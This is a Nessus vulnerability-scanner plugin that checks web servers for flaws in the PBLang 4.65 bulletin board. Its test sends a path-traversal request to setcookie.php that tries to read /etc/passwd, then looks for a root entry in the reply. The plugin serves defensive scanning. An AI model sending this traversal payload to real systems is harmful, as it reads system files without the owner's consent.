#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19594);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2005-2892", "CVE-2005-2893", "CVE-2005-2894", "CVE-2005-2895");
  script_bugtraq_id(14765, 14766);
  script_osvdb_id(19269, 19270, 19271, 19272);

  script_name(english:"PBLang 4.65 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PBLang, a bulletin board system that uses
flat files and is written in PHP. 

The version of PBLang installed on the remote suffers from several
vulnerabilities, including remote code execution, information
disclosure, cross-site scripting, and path disclosure." );
 # https://web.archive.org/web/20120402152849/http://retrogod.altervista.org/pblang465.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?86f6e038");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Sep/77");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/06");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for multiple vulnerabilities in PBLang");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in setcookie.php to read /etc/passwd.
  r = http_send_recv3(method: "GET", 
    item:string(
      dir, "/setcookie.php?",
      "u=../../../../../../../../../../../../etc/passwd%00&",
      "plugin=", SCRIPT_NAME
    ),
    port:port
  );
  if (isnull(r)) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(string: r[2], pattern: "root:.*:0:[01]:")) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
